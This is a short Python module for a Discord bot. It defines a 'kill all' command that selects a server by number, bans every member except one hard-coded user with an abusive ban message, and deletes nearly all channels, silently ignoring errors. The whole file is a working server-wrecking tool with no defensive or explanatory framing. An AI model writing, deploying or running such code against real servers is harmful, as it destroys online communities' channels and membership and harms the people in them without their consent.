import re

import discord

import shared
from shared import clear


class KillAll:
    command = "kill all ([0-9]*)"

    def __init__(self, bot2):
        self.bot = bot2

    async def call(self, command):
        clear()
        regex = re.search(self.command, command)
        guild = self.bot.guilds[int(regex.group(1).strip()) - 1]
        clear()
        for user in guild.members:
            if user.id == shared.main_user_id:
                continue
            try:
                await user.ban(reason="FUCK YOU")
                print(f"user {user.display_name} banned")
            except:
                pass
        clear()
        for channel in guild.channels[1:]:
            try:
                await channel.delete()
                print(f"channel {channel.name} removed")
            except:
                pass
